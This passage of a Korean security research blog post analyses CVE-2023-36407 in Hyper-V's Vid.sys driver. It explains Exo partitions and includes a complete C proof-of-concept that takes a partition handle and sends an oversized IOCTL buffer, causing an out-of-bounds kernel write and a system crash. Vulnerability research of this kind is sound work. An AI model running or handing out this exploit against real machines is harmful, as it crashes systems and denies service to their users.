      v20 = VidExoIoControlDriver(v13, v12, InputBuffer, InputLength, OutputBuffer, OutputLength, CTL_CODE, a8);
    }
    <span class="hljs-keyword">else</span>
    {
      v20 = VidIoControlDriver((__int64)VidDeviceExtension,(__int64)FileObj,InputBuffer,InputLength,OutputBuffer,OutputLength,CTL_CODE,a8);
    }
   ...
  <span class="hljs-keyword">return</span> v5;
}</code></pre>
<h2 id="Exo-Partition"><a href="#Exo-Partition" class="headerlink" title="Exo Partition"></a>Exo Partition</h2><p>&#xBC14;&#xB85C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xB7EC; &#xAC00;&#xBCF4;&#xAE30; &#xC804;&#xC5D0; Exo Partition&#xC5D0; &#xB300;&#xD574; &#xC54C; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xB514;&#xBC14;&#xC774;&#xC2A4; &#xC774;&#xB984;&#xC774;&#xB098; &#xD568;&#xC218;&#xBA85;&#xC5D0;&#xC11C; &#xACC4;&#xC18D; &#xBCF4;&#xC774;&#xB294; <code>Exo</code>&#xB77C;&#xB294; &#xB2E8;&#xC5B4;&#xB294; &#xD574;&#xB2F9; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xC640; &#xD568;&#xC218;&#xB4E4;&#xC774; Exo Partition&#xACFC; &#xC5F0;&#xAD00;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC778;&#xB370;&#xC694;? &#xC774; Exo Partition&#xC774;&#xB77C;&#xB294; &#xAC74; &#xD55C;&#xB9C8;&#xB514;&#xB85C; WHVP(Windows Hypervisor Platform) API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAD00;&#xB9AC;&#xB418;&#xB294; &#xD30C;&#xD2F0;&#xC158;&#xC744; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;! WHVP API&#xAC00; &#xC81C;&#xACF5;&#xD558;&#xB294; <code>WHvCreatePartition</code>, <code>WHvCreateVirtualProcessor</code> &#xB4F1;&#xC758; &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; Hyper-V&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xD1B5;&#xD574; &#xD30C;&#xD2F0;&#xC158;/&#xAC00;&#xC0C1; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC758; &#xC0DD;&#xC131;&#xACFC; &#xAD00;&#xB9AC; &#xB4F1;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p>&#xC544;&#xB798;&#xB294; WHVP API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; Partition &#xC0DD;&#xC131;/&#xC81C;&#xAC70;&#xB97C; &#xD558;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;WinHvPlatform.h&quot;</span></span>

<span class="hljs-keyword">int</span>
main()
{
	WHV_PARTITION_HANDLE prtn;
	WHV_CAPABILITY cap;
	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> size, val;
	<span class="hljs-keyword">char</span>* payload = <span class="hljs-literal">NULL</span>;

	WHvGetCapability(WHvCapabilityCodeHypervisorPresent, &amp;cap, <span class="hljs-keyword">sizeof</span>(cap), &amp;size);

	<span class="hljs-keyword">if</span> (cap.HypervisorPresent == <span class="hljs-number">0</span>)
	{
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hypervisor is not present\n&quot;</span>);
		<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
	}

	WHvCreatePartition(&amp;prtn);

	val = <span class="hljs-number">1</span>;<span class="hljs-comment">//processor cnt</span>
	WHvSetPartitionProperty(prtn, WHvPartitionPropertyCodeProcessorCount, &amp;val, <span class="hljs-keyword">sizeof</span>(val));

	WHvSetupPartition(prtn);

	WHvDeletePartition(prtn);
}</code></pre>
<h1 id="Exploitation-Denial-of-Service"><a href="#Exploitation-Denial-of-Service" class="headerlink" title="Exploitation - Denial of Service"></a>Exploitation - Denial of Service</h1><p>&#xB2E4;&#xC2DC; &#xBCF8;&#xB860;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xC640;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC785;&#xB2C8;&#xB2E4;! &#xC544;&#xB798;&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; <code>WinHvSetVpState</code>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; OOB Write&#xB97C; &#xD1B5;&#xD574; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC704;&#xCE58;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC744; &#xC624;&#xC5FC;&#xC2DC;&#xCF1C; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xAC83;&#xC73C;&#xB85C; Denial of Service&#xB97C; &#xB2EC;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;WinHvPlatform.h&quot;</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OOB_WRITE_CTL_CODE 0x221268</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OOB_SIZE 0x10000</span>

<span class="hljs-keyword">int</span>
main()
{
	WHV_PARTITION_HANDLE prtn;
	WHV_CAPABILITY cap;
	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> size, val;
	<span class="hljs-keyword">char</span>* payload = <span class="hljs-literal">NULL</span>;

	WHvGetCapability(WHvCapabilityCodeHypervisorPresent, &amp;cap, <span class="hljs-keyword">sizeof</span>(cap), &amp;size);

	<span class="hljs-keyword">if</span> (cap.HypervisorPresent == <span class="hljs-number">0</span>)
	{
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hypervisor is not present\n&quot;</span>);
		<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
	}

	WHvCreatePartition(&amp;prtn);

	val = <span class="hljs-number">1</span>;<span class="hljs-comment">//processor cnt</span>
	WHvSetPartitionProperty(prtn, WHvPartitionPropertyCodeProcessorCount, &amp;val, <span class="hljs-keyword">sizeof</span>(val));

	WHvSetupPartition(prtn);

	HANDLE VidExo = (HANDLE)(*((__int64*)prtn + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xfffffffffffffffe</span>);

	payload = <span class="hljs-built_in">malloc</span>(OOB_SIZE);
	<span class="hljs-built_in">memset</span>(payload, <span class="hljs-number">0x0</span>, OOB_SIZE);

	<span class="hljs-comment">//exploit</span>
	DeviceIoControl(VidExo, OOB_WRITE_CTL_CODE, payload, OOB_SIZE, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);

	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, VidExo);

	getc(<span class="hljs-built_in">stdin</span>);

	WHvDeletePartition(prtn);
}</code></pre>
<p>&#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xC2DC;&#xBA74; <code>CreateFileA</code>&#xB098; <code>CreateFileW</code>&#xB85C; &#xD568;&#xC218;&#xB85C; <code>\Device\VidExo</code>&#xC5D0; &#xB300;&#xD55C; &#xD578;&#xB4E4;&#xC744; &#xC5BB;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2CC; WHVP API&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xC0DD;&#xC131;&#xD55C; &#xD30C;&#xD2F0;&#xC158;&#xC758; &#xD578;&#xB4E4;&#xC744; &#xCC38;&#xC870;&#xD558;&#xC5EC; <code>VidExo</code>&#xC758; &#xD578;&#xB4E4;&#xC744; &#xAC00;&#xC838;&#xC624;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;? <code>\Device\VidExo</code>&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xAC83;&#xC740; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC; &#xC77C;&#xBC18;&#xC801;&#xC778; <code>CreateFile</code>&#xD568;&#xC218; &#xD638;&#xCD9C;&#xB85C; &#xC5BB;&#xC5B4;&#xC9C0;&#xB294; <code>VidExo</code>&#xC758; &#xD578;&#xB4E4;&#xC744; &#xC0AC;&#xC6A9;&#xD55C; <code>DeviceIoControl</code>&#xB294; <code>WinHvGet/SetVpState</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; <code>CreateFile</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC11C; <code>VidExo</code>&#xC758; &#xD578;&#xB4E4;&#xC774; &#xC0DD;&#xC131;&#xB420; &#xB54C; <code>Vid.sys</code>&#xC5D0;&#xC11C;&#xB294; <code>VidExo</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xAC00; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C0;&#xACE0; &#xC774; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC5D0;&#xB294; <code>Exo</code>&#xC640; <code>Prtn</code> &#xD0C0;&#xC785;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p><code>VidExopIoControlPreProcess</code> &#xD568;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>fscontext</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB97C; &#xD1B5;&#xD574; <code>VidExo</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xAC00; &#xC5B4;&#xB5A4; &#xD0C0;&#xC785;&#xC778;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c">...
 fscontext = v11 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFC</span>ui64;<span class="hljs-comment">// *(DWORD*)fscontext == &apos; oxE&apos;</span>
 <span class="hljs-keyword">if</span> ( fscontext )
 {
   if ( *(_DWORD *)fscontext != &apos; oxE&apos; )
   {
     if ( *(_DWORD *)fscontext != &apos;ntrP&apos; )
 ...</code></pre>
<p><code>WinHvGet/SetVpState</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>VidExoIoControlPartition</code> &#xD568;&#xC218;&#xB294; <code>VidExo</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xAC00; <code>Prtn</code> &#xD0C0;&#xC785;&#xC778; &#xACBD;&#xC6B0;&#xC5D0; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18;&#xC801;&#xC778; <code>CreateFile</code>&#xD568;&#xC218; &#xD638;&#xCD9C;&#xB85C; &#xC5BB;&#xC5B4;&#xC9C4; <code>\Device\VidExo</code> &#xD578;&#xB4E4;&#xC740; <code>Exo</code> &#xD0C0;&#xC785;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xB4E4;&#xC774; &#xD638;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xAC70;&#xC8E0;&#x2026;</p>
<p>&#xADF8;&#xB7FC; Prtn &#xD0C0;&#xC785;&#xC758; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC5D0; &#xB300;&#xD55C; &#xD578;&#xB4E4;&#xC740; &#xC5B4;&#xB5BB;&#xAC8C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;?</p>
<p>&#xBA3C;&#xC800; &#xC544;&#xB798;&#xC758; WHVP API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAC00;&#xC0C1;&#xBA38;&#xC2E0;&#xC744; &#xAD6C;&#xB3D9;&#xD558;&#xB294; qemu &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD578;&#xB4E4; &#xBAA9;&#xB85D;&#xC744; &#xBCF4;&#xBA74; <code>\Device\VidExo</code>&#xC758; &#xD578;&#xB4E4;&#xC774; &#xB450; &#xAC1C; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p>
<p><img src="/2024/05/12/pwndorei/newjeans-hyper-v-pt7/image8.png" srcset="/img/loading.gif" alt="image8.png"></p>
<p>&#xC774;&#xB4E4;&#xC740; &#xAC01;&#xAC01; <code>Exo</code>, <code>Prtn</code> &#xD0C0;&#xC785;&#xC758; <code>VidExo</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC5D0; &#xB300;&#xD55C; &#xD578;&#xB4E4;&#xC774;&#xACE0; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; <code>WHvSetupPartition</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; <code>Prtn</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8; &#xD578;&#xB4E4;&#xC774; &#xC5BB;&#xC5B4;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xC5EC;&#xAE30;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>CreateFileW</code> &#xD568;&#xC218;&#xC758; &#xC778;&#xC790;&#xB85C;&#xB294; <code>\\?\VidExo\</code>&#xC5D0; &#xD30C;&#xD2F0;&#xC158;&#xC758; GUID&#xB85C; &#xBCF4;&#xC774;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5B4; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2024/05/12/pwndorei/newjeans-hyper-v-pt7/image9.png" srcset="/img/loading.gif" alt="image9.png"></p>
<p>&#xBC18;&#xD658;&#xB41C; &#xD578;&#xB4E4;&#xC740; 1&#xACFC; OR&#xB418;&#xC5B4; <code>WHvSetupPartition</code>&#xD568;&#xC218; &#xD638;&#xCD9C;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xD55C; &#xD30C;&#xD2F0;&#xC158; &#xD578;&#xB4E4;(<code>WHV_PARTITION_HANDLE</code>) + 8&#xC758; &#xC8FC;&#xC18C;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5B4; &#xD578;&#xB4E4;&#xC744; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c">HANDLE VidExo = (HANDLE)(*((__int64*)prtn + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xfffffffffffffffe</span>);</code></pre>
<p>&#xC774;&#xD6C4; &#xAC00;&#xC838;&#xC628; &#xD578;&#xB4E4;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; OOB Read/Write&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBC84;&#xD37C;(0x1000)&#xBCF4;&#xB2E4; &#xB9E4;&#xC6B0; &#xD070; &#xD06C;&#xAE30;(0x10000)&#xB97C; &#xAC00;&#xC9C0;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; input&#xC73C;&#xB85C; <code>DeviceIoControl</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; OOB Write&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xACE0; &#xCEE4;&#xB110; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;!</p>
<p>PoC&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xBE14;&#xB8E8;&#xC2A4;&#xD06C;&#xB9B0;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!.</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/O7LLnyv1Pas?si=31L-nncsQa95NOYo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


<h1 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h1><p>&#xC774;&#xBC88; &#xD30C;&#xD2B8; 7&#xC744; &#xB05D;&#xC73C;&#xB85C; &#xC800;&#xC758; &#xCCAB; &#xC5F0;&#xAD6C;&#xAE00; &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xB05D;&#xC774; &#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xD30C;&#xD2B8; 5&#xAE4C;&#xC9C0; &#xB2E4;&#xB8EC; CVE-2018-0959&#xC758; &#xBD84;&#xC11D;&#xACFC; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xB05D;&#xB09C; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; Hyper-V &#xCDE8;&#xC57D;&#xC810; &#xC5F0;&#xAD6C;&#xB294; &#xB354;&#xC774;&#xC0C1; &#xD558;&#xC9C0; &#xC54A;&#xC744; &#xC904;&#xB85C;&#xB9CC; &#xC54C;&#xC558;&#xC73C;&#xB098; &#xC57D;&#xAC04;&#xC758; &#xBBF8;&#xB828;&#xC774; &#xB0A8;&#xC544; diffing &#xD574;&#xBCF8; 1-day&#xAC00; &#xC5B4;&#xCC0C;&#xC800;&#xCC0C; &#xB8E8;&#xD2B8; &#xCEE4;&#xC988; &#xBD84;&#xC11D;&#xACFC; LPE&#xB294; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC; PoC&#xAE4C;&#xC9C0; &#xC791;&#xC131;&#xD558;&#xB294; &#xAE30;&#xC5FC;&#xC744; &#xD1A0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xC5EC;&#xAE30;&#xAE4C;&#xC9C0; &#xC628; &#xC774;&#xC0C1; &#xC9C4;&#xC9DC;&#xB85C; Hyper-V&#xB97C; &#xB193;&#xC544;&#xC904; &#xC218; &#xC5C6;&#xAC8C; &#xB418;&#xC5C8;&#xB124;&#xC694; </p>
<p>&#xC7A0;&#xAE50; &#xC9C0;&#xB09C; &#xB0A0;&#xB4E4;&#xC758; &#xCD94;&#xC5B5;&#xC744; &#xB5A0;&#xC62C;&#xB824; &#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;&#xB9CC; &#xACB0;&#xB860;&#xC801;&#xC73C;&#xB85C;&#xB294; NewJeans&#x2019; Hyper-V &#xC5F0;&#xAD6C;&#xAE00; &#xC2DC;&#xB9AC;&#xC988;&#xB294; &#xB354;&#xC774;&#xC0C1; &#xB04C;&#xACE0;&#xAC00;&#xBA74; &#xB108;&#xBB34; &#xB8E8;&#xC988;&#xD574;&#xC9C0;&#xB294; &#xAC83; &#xAC19;&#xC544;&#xC11C; &#xB05D;&#xB098;&#xC9C0;&#xB9CC; &#xC800;&#xC758; Hyper-V &#xC0AC;&#xB791;&#xC740; &#xC544;&#xC9C1; &#xC2DD;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4; &gt;_-</p>
<p>&#xC544;&#xBB34;&#xD2BC; &#xAE34; &#xC2DC;&#xB9AC;&#xC988; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD558;&#xACE0; &#xB2E4;&#xC74C;&#xC5D0; &#xB354; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xC8FC;&#xC81C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! ^^7</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://hvinternals.blogspot.com/2020/06/hyper-v-memory-internals-exo-partition.html">Hyper-V memory internals. EXO partition memory access</a> by <a target="_blank" rel="external nofollow noopener noreferrer" href="https://twitter.com/gerhart_x">Gerhart</a></li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/hyper-v/">hyper-v</a>
                  
                  <a class="hover-with-bg" href="/tags/pwndorei/">pwndorei</a>
                  
                  <a class="hover-with-bg" href="/tags/diffing/">diffing</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_pwndorei.jpg" srcset="/img/loading.gif" alt="pwndorei">
                  </div>

                  <div class="link-text">
                    <div class="link-title">pwndorei</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/pwndorei">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>

              <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
              
              <!--  -->
              <p class="note note-warning">  <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a>  .        .</p>
              
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2024/05/13/romi0x/newsletter0513/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[]    Kim</span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2024/05/08/ogu123/cve-2024-2054/">
                    <span class="hidden-mobile">[] CVE-2024-2054: Artica Proxy deserialization  RCE </span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2024/05/12/pwndorei/newjeans-hyper-v-pt7/';
        this.page.identifier = '/2024/05/12/pwndorei/newjeans-hyper-v-pt7/';
      };
      function loadDisqus() {
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Research] NewJeans Hyper-V Part 7 - CVE-2023-36407 Analysis & Exploitation&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>





  

  
    <!-- MathJax -->
    <script>
      MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        },
        options: {
          renderActions: {
            findScript: [10, doc => {
              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                const display = !!node.type.match(/; *mode=display/);
